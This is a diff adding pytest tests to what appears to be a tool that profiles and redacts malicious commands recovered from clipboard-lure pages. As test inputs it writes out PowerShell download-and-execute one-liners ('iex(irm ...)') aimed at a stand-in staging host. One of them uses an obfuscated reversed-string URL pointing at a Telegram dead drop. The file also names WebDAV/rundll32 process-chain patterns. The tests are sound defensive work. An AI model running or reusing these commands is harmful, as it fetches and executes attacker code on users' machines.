@@ -85,7 +85,46 @@ def test_command_profiles_distinguish_major_chains() -> None:
     assert telegram["processes"] == ["powershell.exe"]
     assert webdav["pattern"] == "webdav_rundll32"
     assert webdav["processes"] == ["conhost.exe", "cmd.exe", "rundll32.exe"]
+    assert [item["image"] for item in webdav["process_chain"]] == webdav["processes"]
+    assert webdav["process_chain_status"] == "recovered_from_command_not_executed"
+    assert webdav["command_line_public"].startswith("conhost --headless")
+    assert webdav["command_line_status"] == "recovered_not_executed"
+    assert len(webdav["command_sha256"]) == 64
     assert mapped["pattern"] == "mapped_webdav_command"
+
+
+def test_command_profile_publishes_structure_but_redacts_url_secrets() -> None:
+    raw_command = (
+        "powershell  -w h -c \"iex(irm "
+        "'https://user:password@stage.test/a?token=secret#fragment')\""
+    )
+
+    profile = target.command_profile(raw_command)
+
+    assert profile["command_line_public"] == (
+        "powershell  -w h -c \"iex(irm 'https://stage.test/a')\""
+    )
+    assert profile["command_line_normalized"] == (
+        "powershell -w h -c \"iex(irm 'https://stage.test/a')\""
+    )
+    assert profile["command_line_length"] == len(raw_command)
+    assert "password" not in profile["command_line_public"]
+    assert "token=" not in profile["command_line_public"]
+    assert profile["processes"] == ["powershell.exe"]
+
+
+def test_command_profile_redacts_reversed_dual_use_token_path() -> None:
+    raw_command = (
+        "powershell $v=-join('0ETN3AmHI8hIMsWY+/em.t//:sptth'[-1..-30]);"
+        "$j=irm($v);if($j-match'_description'){iex $j}"
+    )
+
+    profile = target.command_profile(raw_command)
+
+    assert profile["pattern"] == "telegram_dead_drop_powershell"
+    assert "0ETN3AmHI8hIMsWY+" not in profile["command_line_public"]
+    assert "'<redacted-reversed-url>'[-1..-30]" in profile["command_line_public"]
+    assert profile["command_sha256"] == target.hashlib.sha256(raw_command.encode()).hexdigest()
 
 
 def test_command_profile_rejects_reverse_tme_substring_without_reverse_syntax() -> None:
@@ -364,6 +403,9 @@ def test_browser_observation_captures_command_without_public_raw_value() -> None
     assert summary["browser_clipboard_events"] == 1
     assert summary["candidate_commands_live"][0]["pattern"] == "powershell_download_execute"
     assert summary["candidate_commands_live"][0]["stage_urls"] == ["https://stage.test/a"]
+    assert summary["candidate_commands_live"][0]["command_line_public"] == (
+        "powershell -w h -c \"iex(irm 'https://stage.test/a')\""
+    )
     assert browser["page"]["final_url"]["sanitized"] == "https://browser.test/a"
     assert "private_value" not in public["browser_observation"]["clipboard_events"][0]
 
@@ -433,5 +475,10 @@ def test_infection_chain_records_supported_stages_and_stop_point() -> None:
     assert by_phase["CF-01"]["status"] == "observed"
     assert by_phase["CF-03"]["status"] == "provider_reported"
     assert by_phase["CF-04"]["status"] == "not_observed"
+    assert chain["command_line_public"] == raw_command
+    assert chain["command_line_status"] == "recovered_not_executed"
+    assert chain["processes"] == ["powershell.exe"]
     assert "flowchart LR" in rendered
     assert "CF-03" in rendered
+    assert "復元command line（秘密値のみ置換、未実行）" in rendered
+    assert raw_command in rendered
